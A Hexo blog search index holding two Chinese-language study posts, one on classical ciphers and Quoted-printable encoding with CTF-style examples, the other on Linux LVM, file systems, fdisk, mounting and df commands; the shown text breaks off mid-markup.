<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>crypto</title>
      <link href="/2024/09/26/crypto/"/>
      <url>/2024/09/26/crypto/</url>
      
        <content type="html"><![CDATA[<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h2 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h2><p>凯撒(Caesar)密码是公元前一世纪在高卢战争时被使用的，它是将<strong>英文字母向前移动k位</strong>。</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文flag&#123;genshin impact launch!&#125;</span><br><span class="line">当k=3时</span><br><span class="line">密文iodj&#123;jhqvklq lpsdfw odxqfk!&#125;</span><br></pre></td></tr></table></figure><h3 id="Rot5、13"><a href="#Rot5、13" class="headerlink" title="Rot5、13"></a>Rot5、13</h3><p>Rot是凯撒密码的<strong>特殊情况</strong>，即步长（k的值）是固定的。常见的步长为5、13、18、47。</p><h2 id="栏栅密码"><a href="#栏栅密码" class="headerlink" title="栏栅密码"></a>栏栅密码</h2><p>栏栅密码（也叫栅栏密码，英文称为Rail Fence Cipher）是一种古老的换位加密算法。它通过将明文字符按照<strong>Z字形</strong>在不同的栏栅（行）之间交错排列，再按照行的顺序读取出来形成密文。</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">假设明文是 &quot;HELLOCTF&quot;，使用3栏栅（即栏栅为3）加密</span><br><span class="line">1、先使用Z字形排列明文，如下</span><br><span class="line">H       L       T</span><br><span class="line"> E   L   O   C   F</span><br><span class="line">  L       O</span><br><span class="line">2、然后按行读取字符</span><br><span class="line">第一行：HLT</span><br><span class="line">第二行：ELOCF</span><br><span class="line">第三行：LO</span><br><span class="line">3、将各行字符拼接，得到密文</span><br><span class="line">HLTELOCFLO</span><br></pre></td></tr></table></figure><h2 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h2><p>摩斯密码（Morse Code）是一种早期的电报通信方式，通过短音（点）和长音（划）来表示字母和数字。它可以用来将字母、数字甚至标点符号编码成一系列的点和划。</p><p>摩斯密码的基本规则：</p><ul><li><p><strong>点</strong>（.）表示短音，<strong>划</strong>（-）表示长音。</p></li><li><p>字母之间用空格隔开，单词之间用更长的空格隔开。</p><div align = "center">摩斯密码表</div></li></ul><table><thead><tr><th><strong>字符</strong></th><th><strong>电码符号</strong></th><th><strong>字符</strong></th><th><strong>电码符号</strong></th><th><strong>字符</strong></th><th><strong>电码符号</strong></th><th><strong>字符</strong></th><th><strong>电码符号</strong></th></tr></thead><tbody><tr><td>A</td><td>．━</td><td>B</td><td>━ ．．．</td><td>C</td><td>━ ．━ ．</td><td>D</td><td>━ ．．</td></tr><tr><td>E</td><td>．</td><td>F</td><td>．．━ ．</td><td>G</td><td>━ ━ ．</td><td>H</td><td>．．．．</td></tr><tr><td>I</td><td>．．</td><td>J</td><td>．━ ━ ━</td><td>K</td><td>━ ．━</td><td>L</td><td>．━ ．．</td></tr><tr><td>M</td><td>━ ━</td><td>N</td><td>━ ．</td><td>O</td><td>━ ━ ━</td><td>P</td><td>．━ ━ ．</td></tr><tr><td>Q</td><td>━ ━ ．━</td><td>R</td><td>．━ ．</td><td>S</td><td>．．．</td><td>T</td><td>━</td></tr><tr><td>U</td><td>．．━</td><td>V</td><td>．．．━</td><td>W</td><td>．━ ━</td><td>X</td><td>━ ．．━</td></tr><tr><td>Y</td><td>━ ．━ ━</td><td>Z</td><td>━ ━ ．．</td><td></td><td></td><td></td><td></td></tr><tr><td>0</td><td>━ ━ ━ ━ ━</td><td>1</td><td>．━ ━ ━ ━</td><td>2</td><td>．．━ ━ ━</td><td>3</td><td>．．．━ ━</td></tr><tr><td>4</td><td>．．．．━</td><td>5</td><td>．．．．．</td><td>6</td><td>━ ．．．．</td><td>7</td><td>━ ━ ．．．</td></tr><tr><td>8</td><td>━ ━ ━ ．．</td><td>9</td><td>━ ━ ━ ━ ．</td><td></td><td></td><td></td><td></td></tr><tr><td>.</td><td>．━ ．━ ．━</td><td>:</td><td>━ ━ ━ ．．．</td><td>,</td><td>━ ━ ．．━ ━</td><td>;</td><td>━ ．━ ．━ ．</td></tr><tr><td>?</td><td>．．━ ━ ．．</td><td>=</td><td>━ ．．．━</td><td>‘</td><td>．━ ━ ━ ━ ．</td><td>/</td><td>━ ．．━ ．</td></tr><tr><td>!</td><td>━ ．━ ．━ ━</td><td>━</td><td>━ ．．．．━</td><td>_</td><td>．．━ ━ ．━</td><td>“</td><td>．━ ．．━ ．</td></tr><tr><td>(</td><td>━ ．━ ━ ．</td><td>)</td><td>━ ．━ ━ ．━</td><td>$</td><td>．．．━ ．．━</td><td>&amp;</td><td>． ．．．</td></tr><tr><td>@</td><td>．━ ━ ．━ ．</td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">密文</span><br><span class="line">--. . -. ... .... .. -. .. -- .--. .- -.-. - .-.. .- ..- -. -.-. .... </span><br><span class="line">明文</span><br><span class="line">GenshinImpactLaunch</span><br></pre></td></tr></table></figure><h1 id="非对称加密算法"><a href="#非对称加密算法" class="headerlink" title="非对称加密算法"></a>非对称加密算法</h1><h2 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h2><h1 id="编码与序列化"><a href="#编码与序列化" class="headerlink" title="编码与序列化"></a>编码与序列化</h1><h2 id="Quoted-printable编码"><a href="#Quoted-printable编码" class="headerlink" title="Quoted-printable编码"></a>Quoted-printable编码</h2><p><strong>Quoted-Printable</strong> 是一种编码方法，常用于电子邮件传输中，<strong>将二进制数据或非ASCII字符编码成纯ASCII格式</strong>。这种编码方式保证数据在传输时不会因为不同平台或传输协议的差异而出现问题，尤其是在电子邮件中处理非ASCII字符时特别有用。</p><h3 id="Quoted-Printable-编码规则："><a href="#Quoted-Printable-编码规则：" class="headerlink" title="Quoted-Printable 编码规则："></a>Quoted-Printable 编码规则：</h3><ol><li><strong>ASCII可打印字符</strong>（值在33到126之间，除去<code>=</code>号）的字节保持原样。</li><li>特殊字符（例如ASCII控制字符，值小于33，或非ASCII字符，值大于126）会被编码成<code>=</code>后跟随字符的十六进制表示（大写）。<ul><li>例如，空格的ASCII码是32，用Quoted-Printable编码表示为 <code>=20</code>。</li><li>等号 <code>=</code> 本身在Quoted-Printable编码中用 <code>=3D</code> 表示。</li></ul></li><li><strong>换行符</strong>：行末的换行符被编码为 <code>CRLF</code> （即回车+换行，<code>\r\n</code>），不会被编码成Quoted-Printable格式。</li><li><strong>行长度限制</strong>：编码后的每一行最多不超过76个字符。如果一行超出了76个字符，使用 <code>=</code> 作为软换行符，将长行分成多行。</li></ol><p>示例：BUU-Quoted-printable</p><p>密文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6</span><br></pre></td></tr></table></figure><p>根据<a href="http://www.hiencode.com/quoted.html#:~:text=%E5%9C%A8%E7%BA%BFQuoted-p">在线Quoted-printable编解码网站</a>,解码后得到明文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那你也很棒哦</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux PV、VG、LV</title>
      <link href="/2023/12/21/Linux-PV%E3%80%81VG%E3%80%81LV/"/>
      <url>/2023/12/21/Linux-PV%E3%80%81VG%E3%80%81LV/</url>
      
        <content type="html"><![CDATA[<h1 id="LVM"><a href="#LVM" class="headerlink" title="LVM"></a>LVM</h1><p>LVM（Logical Volume Manager，逻辑卷管理器）是一种用于管理磁盘和存储的高级工具，它可以将多个物理磁盘组合成一个或多个逻辑卷，从而提供更灵活和可扩展的存储管理。LVM 由三个主要组件组成：物理卷（PV）、卷组（VG）和逻辑卷（LV）。</p><p>LVM 提供了以下优点：</p><ul><li><p>灵活性：LVM 允许您动态地添加或删除物理卷和逻辑卷，以便调整存储空间的大小和分配。</p></li><li><p>可靠性：LVM 可以提高数据的可靠性，因为它可以在多个物理磁盘上创建冗余存储，从而避免单点故障。</p></li><li><p>性能：LVM 可以提高磁盘 I/O 性能，因为它可以将多个物理磁盘组合成一个逻辑卷，从而提高磁盘读写速度。</p></li><li><p>备份和恢复：LVM 允许您在不影响正在运行的系统的情况下备份和恢复数据。您可以在运行时备份逻辑卷，并在需要时恢复它们。</p></li></ul><p>LVM 是一种强大的存储管理工具，它可以提高存储空间的利用率，提高数据的可靠性和性能，并提供更灵活的备份和恢复选项。</p><p><img src="https://img-blog.csdn.net/20180705143700450?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3l1ZnVsb28=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70"></p><p><img src="https://s2.51cto.com/images/blog/202305/26024753_646fad594b10e96687.png?x-oss-process=image/watermark,size_16,text_QDUxQ1RP5Y2a5a6i,color_FFFFFF,t_30,g_se,x_10,y_10,shadow_20,type_ZmFuZ3poZW5naGVpdGk=/format,webp"></p><h2 id="PV"><a href="#PV" class="headerlink" title="PV"></a>PV</h2><p>操作物理卷（Physical Volume，PV）是<strong>物理磁盘或分区</strong>，它们被标记为 LVM 物理卷，以便将其添加到卷组中。</p><p>以下是一些常用的操作物理卷的命令及其用法：</p><ol><li><p>创建物理卷：</p><ul><li><code>pvcreate</code>：创建一个新的物理卷。<ul><li>示例：<code>pvcreate /dev/sdb1</code>，创建一个名为 <code>/dev/sdb1</code> 的物理卷。</li></ul></li></ul></li><li><p>显示物理卷信息：</p><ul><li><code>pvdisplay</code>：显示所有物理卷的详细信息。</li><li><strong><code>pvs</code>：以表格形式显示物理卷的摘要信息。</strong></li></ul></li><li><p>扩展物理卷：</p><ul><li><code>pvresize</code>：扩展或缩小物理卷的大小。<ul><li>示例：<code>pvresize /dev/sdb1</code>，将物理卷 <code>/dev/sdb1</code> 的大小调整为其所在磁盘的可用空间大小。</li></ul></li></ul></li><li><p>删除物理卷：</p><ul><li><code>pvremove</code>：删除一个物理卷。<ul><li>示例：<code>pvremove /dev/sdb1</code>，删除名为 <code>/dev/sdb1</code> 的物理卷。</li></ul></li></ul></li></ol><h2 id="VG"><a href="#VG" class="headerlink" title="VG"></a>VG</h2><p>VG（Volume Group，卷组）是由<strong>一个或多个物理卷（PV）</strong>组成的逻辑卷组，它们被组合在一起以提供更大的存储空间。卷组可以动态地添加或删除物理卷，从而实现存储空间的动态扩展和收缩。</p><p>以下是一些常用的操作卷组（Volume Group，VG）的命令：</p><ol><li><p><code>vgcreate</code>：创建一个新的卷组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgcreate &lt;卷组名称&gt; &lt;物理卷1&gt; &lt;物理卷2&gt; ...</span><br></pre></td></tr></table></figure></li><li><p><code>vgextend</code>：扩展现有的卷组，将一个或多个物理卷添加到卷组中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgextend &lt;卷组名称&gt; &lt;物理卷1&gt; &lt;物理卷2&gt; ...</span><br></pre></td></tr></table></figure></li><li><p><code>vgreduce</code>：从卷组中移除一个或多个物理卷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgreduce &lt;卷组名称&gt; &lt;物理卷1&gt; &lt;物理卷2&gt; ...</span><br></pre></td></tr></table></figure></li><li><p><code>vgdisplay</code>：显示卷组的详细信息，包括卷组的名称、物理卷列表、逻辑卷列表等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgdisplay &lt;卷组名称&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>vgrename</code>：重命名一个卷组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgrename &lt;旧卷组名称&gt; &lt;新卷组名称&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>vgchange</code>：修改卷组的属性，如启用或禁用自动扩展功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vgchange -a y &lt;卷组名称&gt;  # 启用卷组</span><br><span class="line">vgchange -a n &lt;卷组名称&gt;  # 禁用卷组</span><br></pre></td></tr></table></figure></li><li><p><code>vgremove</code>：删除一个卷组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vgremove &lt;卷组名称&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="LV"><a href="#LV" class="headerlink" title="LV"></a>LV</h2><p>LV（Logical Volume，逻辑卷）：逻辑卷是从卷组中分配的存储空间，它们可以被格式化为文件系统，并用于存储数据。逻辑卷可以动态地调整大小，以便为文件系统添加更多的空间。</p><p>以下是一些常用的操作逻辑卷（Logical Volume，LV）的命令：</p><ol><li><p><code>lvcreate</code>：创建一个新的逻辑卷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvcreate -L &lt;大小&gt; -n &lt;逻辑卷名称&gt; &lt;卷组名称&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>lvextend</code>：扩展现有的逻辑卷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvextend -L +&lt;增加的大小&gt; &lt;逻辑卷路径&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>lvreduce</code>：缩减现有的逻辑卷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvreduce -L -&lt;减少的大小&gt; &lt;逻辑卷路径&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>lvresize</code>：调整逻辑卷的大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvresize -L &lt;新大小&gt; &lt;逻辑卷路径&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>lvdisplay</code>：显示逻辑卷的详细信息，包括逻辑卷的名称、大小、卷组、文件系统类型等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvdisplay &lt;逻辑卷路径&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>lvrename</code>：重命名一个逻辑卷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvrename &lt;卷组名称&gt; &lt;旧逻辑卷名称&gt; &lt;新逻辑卷名称&gt;</span><br></pre></td></tr></table></figure></li><li><p><code>lvremove</code>：删除一个逻辑卷。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvremove &lt;逻辑卷路径&gt;</span><br></pre></td></tr></table></figure></li></ol><h2 id="FS"><a href="#FS" class="headerlink" title="FS"></a>FS</h2><p>FS（File System，文件系统）</p><h3 id="常用文件系统"><a href="#常用文件系统" class="headerlink" title="常用文件系统"></a>常用文件系统</h3><p>在Linux系统中，有几种常用的文件系统，下面是对它们的简要介绍：</p><ol><li><p><strong>ext4</strong>（第四扩展文件系统）：</p><ul><li>是Linux系统上最常用的文件系统之一。</li><li>支持文件和目录的权限控制、日志记录、快速恢复等功能。</li><li>具有较高的性能和稳定性。</li><li>可以通过使用<code>mkfs.ext4</code>命令在逻辑卷上创建ext4文件系统。</li></ul></li><li><p><strong>XFS</strong>（扩展文件系统）：</p><ul><li>也是一种常用的Linux文件系统。</li><li>针对大容量和高性能设计，适用于大型服务器和存储系统。</li><li>支持快速创建、删除和扩展文件系统，具有高并发性能和高吞吐量。</li><li>可以通过使用<code>mkfs.xfs</code>命令在逻辑卷上创建XFS文件系统。</li></ul></li><li><p><strong>Btrfs</strong>（B树文件系统）：</p><ul><li>是Linux系统上的一种先进的文件系统。</li><li>具有快照、压缩、在线文件系统检查和修复等高级功能。</li><li>支持多个磁盘的联合使用，具有较好的容错性。</li><li>可以通过使用<code>mkfs.btrfs</code>命令在逻辑卷上创建Btrfs文件系统。</li></ul></li><li><p><strong>ZFS</strong>（Zettabyte文件系统）：</p><ul><li>是一种先进的文件系统，最初由Sun Microsystems开发，现在在Linux系统上也得到了支持。</li><li>具有强大的数据完整性和数据保护功能，支持快照、克隆和数据压缩。</li><li>可以通过使用<code>zpool</code>和<code>zfs</code>命令在逻辑卷上创建和管理ZFS文件系统。</li></ul></li><li><p><strong>FAT32</strong>（文件分配表32）：</p><ul><li>是一种通用的文件系统格式，可以在Linux和Windows系统上使用。</li><li>支持较大的文件和分区大小，但不支持文件和目录的权限控制。</li><li>可以通过使用<code>mkfs.fat</code>命令在逻辑卷上创建FAT32文件系统。</li></ul></li></ol><p>这些是Linux系统中常用的文件系统，每种文件系统都有其特定的用途和优势。选择文件系统时，需要考虑性能、可靠性、安全性和特定需求等因素。</p><h3 id="mkfs"><a href="#mkfs" class="headerlink" title="mkfs"></a>mkfs</h3><p><code>mkfs</code>命令用于在Linux系统上<strong>创建文件系统</strong>。它通常与设备路径一起使用，以在设备上创建文件系统。</p><p><code>mkfs.系统类型 实际设备路径</code></p><p>例</p><p><code>mkfs</code>命令用于在Linux系统上创建文件系统。它通常与设备路径一起使用，以在设备上创建文件系统。</p><p>以下是一些常用的<code>mkfs</code>命令及其用法：</p><ol><li><p><code>mkfs.ext4</code>：创建ext4文件系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext4 /dev/sdX</span><br></pre></td></tr></table></figure></li><li><p><code>mkfs.ext3</code>：创建ext3文件系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext3 /dev/sdX</span><br></pre></td></tr></table></figure></li><li><p><code>mkfs.ext2</code>：创建ext2文件系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.ext2 /dev/sdX</span><br></pre></td></tr></table></figure></li><li><p><code>mkfs.xfs</code>：创建XFS文件系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.xfs /dev/sdX</span><br></pre></td></tr></table></figure></li><li><p><code>mkfs.btrfs</code>：创建Btrfs文件系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.btrfs /dev/sdX</span><br></pre></td></tr></table></figure></li></ol><p>在使用<code>mkfs</code>命令之前，请确保已经备份了设备上的数据，因为<strong>创建文件系统将会清除该设备上的所有数据。</strong></p><h2 id="MP"><a href="#MP" class="headerlink" title="MP"></a>MP</h2><p>MP（Mounting Point，挂载点）是将文件系统连接到Linux文件系统层次结构的目录。它是将<strong>存储设备</strong>（如硬盘、分区、逻辑卷等）与文件系统的<strong>根目录或其他目录</strong>进行关联的方式。</p><p>在Linux系统中，文件系统层次结构是以<strong>树形结构</strong>组织的，从根目录（/）开始，通过目录的嵌套关系形成一个层次结构。通过挂载点，可以将不同的存储设备中的文件系统连接到这个层次结构中的特定目录上，使得文件系统中的文件和目录可以在这些挂载点所代表的位置上访问和操作。</p><p>挂载点的作用有以下几个方面：</p><ol><li><p>文件系统访问：通过挂载点，可以将文件系统中的文件和目录以类似于普通目录的方式在文件系统层次结构中呈现，使其可以被应用程序和用户访问。</p></li><li><p>存储扩展：通过挂载点，可以将额外的存储设备连接到文件系统中，扩展系统的存储容量。例如，可以将新的硬盘分区或逻辑卷挂载到文件系统的特定目录上，以增加可用空间。</p></li><li><p>分区管理：通过挂载点，可以将不同的分区或逻辑卷挂载到不同的目录上，实现对不同分区或逻辑卷的管理和隔离。这样可以更好地组织和管理文件系统中的数据。</p></li><li><p>多个操作系统共享数据：通过挂载点，可以在多个操作系统之间共享数据。例如，可以将一个文件系统挂载到多个操作系统上的不同挂载点，使得这些操作系统可以共享同一份数据。</p></li></ol><p>需要注意的是，挂载点必须是一个空目录或者已经卸载的目录，否则挂载操作会失败。通常，系统会在启动时自动挂载一些默认的文件系统，如根文件系统（/）和/boot目录。其他的挂载点可以根据需要手动设置。</p><p>通过合理设置挂载点，可以灵活地管理和组织文件系统中的数据，实现存储扩展、数据共享和分区管理等功能。对于服务器和大型存储系统来说，挂载点的设置尤为重要，需要根据需求和性能考虑进行合理的规划和配置。</p><h1 id="fdisk"><a href="#fdisk" class="headerlink" title="fdisk"></a>fdisk</h1><p><code>fdisk</code>是一个用于管理磁盘分区的命令行工具。它允许您创建、删除、调整和显示磁盘分区。</p><p>以下是一些常用的<code>fdisk</code>命令：</p><ul><li><code>fdisk -l</code>：显示系统上所有的磁盘和分区的详细信息。</li><li><code>fdisk /dev/sdX</code>：打开指定磁盘（例如<code>/dev/sda</code>）进行分区操作。</li><li><code>m</code>：显示<code>fdisk</code>命令的帮助信息。</li><li><code>n</code>：创建一个新分区。</li><li><code>d</code>：删除一个分区。</li><li><code>p</code>：显示分区表。</li><li><code>w</code>：保存并退出<code>fdisk</code>。</li></ul><p>请注意，对磁盘进行分区操作可能会导致数据丢失，请在操作之前确保您已经对磁盘进行了备份。</p><p>如果您想了解更详细的<code>fdisk</code>命令和用法，请参考<code>fdisk</code>的手册页，可以使用以下命令查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man fdisk</span><br></pre></td></tr></table></figure><h1 id="挂载"><a href="#挂载" class="headerlink" title="挂载"></a>挂载</h1><p>在Linux系统中，挂载（mount）命令用于将文件系统连接到指定的挂载点，使得文件系统中的文件和目录可以在该挂载点上访问。</p><h2 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h2><p>以下是挂载命令的基本语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount [-t 文件系统类型] [-o 选项] 设备文件 挂载点</span><br></pre></td></tr></table></figure><p>其中，常用的选项包括：</p><ul><li><code>-t 文件系统类型</code>：指定要挂载的文件系统类型，例如ext4、xfs等。如果不指定该选项，系统会自动识别文件系统类型。</li><li><code>-o 选项</code>：指定挂载选项，例如读写权限、挂载参数等。多个选项之间用逗号分隔。</li></ul><p>以下是一些常见的挂载命令示例：</p><ol><li><p>挂载设备到指定的挂载点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sdX /mnt</span><br></pre></td></tr></table></figure></li><li><p>指定文件系统类型和挂载选项进行挂载：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t ext4 -o rw /dev/sdX /mnt</span><br></pre></td></tr></table></figure></li><li><p>挂载网络文件系统（NFS）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t nfs server:/path /mnt</span><br></pre></td></tr></table></figure></li><li><p>挂载ISO镜像文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -o loop /path/to/image.iso /mnt</span><br></pre></td></tr></table></figure></li></ol><p>请注意，<code>/dev/sdX</code>是要挂载的设备文件路径，<code>/mnt</code>是挂载点路径。确保挂载点存在并且为空。挂载点可以是任何空目录，您可以根据需要自行创建。</p><h2 id="etc-fstab"><a href="#etc-fstab" class="headerlink" title="/etc/fstab"></a>/etc/fstab</h2><p>在Linux系统中，<strong>开机时检索的挂载配置文件</strong>是<code>/etc/fstab</code>（File System Table）文件。该文件包含了系统启动时需要挂载的文件系统的信息。</p><p><code>/etc/fstab</code>文件的每一行描述了一个要挂载的文件系统，其基本格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;设备文件&gt; &lt;挂载点&gt; &lt;文件系统类型&gt; &lt;挂载选项&gt; &lt;dump选项&gt; &lt;fsck选项&gt;</span><br></pre></td></tr></table></figure><p>其中，各字段的含义如下：</p><ul><li><code>&lt;设备文件&gt;</code>：要挂载的设备文件路径，可以是硬盘分区、软盘、光盘、网络文件系统等。</li><li><code>&lt;挂载点&gt;</code>：文件系统挂载的目标路径，通常是一个空目录。</li><li><code>&lt;文件系统类型&gt;</code>：要挂载的文件系统类型，例如ext4、xfs、nfs等。</li><li><code>&lt;挂载选项&gt;</code>：挂载时的选项，例如读写权限、挂载参数等。</li><li><code>&lt;dump选项&gt;</code>：备份工具dump使用的选项，一般设置为0。</li><li><code>&lt;fsck选项&gt;</code>：文件系统检查工具fsck使用的选项，一般设置为1。</li></ul><p>以下是一个示例<code>/etc/fstab</code>文件的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/dev/sda1   /       ext4    defaults        0       1</span><br><span class="line">/dev/sdb1   /data   xfs     defaults        0       2</span><br></pre></td></tr></table></figure><p>上述示例中，第一行表示将<code>/dev/sda1</code>设备上的ext4文件系统挂载到根目录<code>/</code>，并使用默认挂载选项。第二行表示将<code>/dev/sdb1</code>设备上的xfs文件系统挂载到<code>/data</code>目录，并使用默认挂载选项。</p><p>请注意，修改<code>/etc/fstab</code>文件需要管理员权限。在修改前，建议备份原始文件以防止错误。</p><p>PS：</p><p>1.新建LV时需要指定LV的大小。例<code>lvcreate -L 50G lvuser datavg</code></p><p>2.格式化LV。例<code>mkfs.xfs /dev/datavg/lvuser（实际设备路径）</code>    </p><p>3.挂载LV。例<code>mount /dev/datavg/lvuser /home/user</code></p><h1 id="df"><a href="#df" class="headerlink" title="df"></a>df</h1><p>df（disk free）命令用来显示磁盘的使用情况，包括磁盘的总容量、已用空间、可用空间和使用百分比。它可以帮助我们监控磁盘的空间是否充足，以及哪些分区或文件系统占用了较多的空间。</p><p>基本语法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df [选项] [文件名]</span><br></pre></td></tr></table></figure><p><code>-h</code>或<code>--human-readable</code>：以人类可读的方式显示磁盘容量，如K、M、G等。<br><code>-T</code>或<code>--print-type</code>：显示每个文件系统的类型，如ext4、xfs等。<br><code>-a</code>或<code>--all</code>：显示所有文件系统，包括特殊的文件系统，如proc、sysfs等。<br><code>-i</code>或<code>--inodes</code>：显示每个文件系统的inode信息，即文件数量和使用情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span 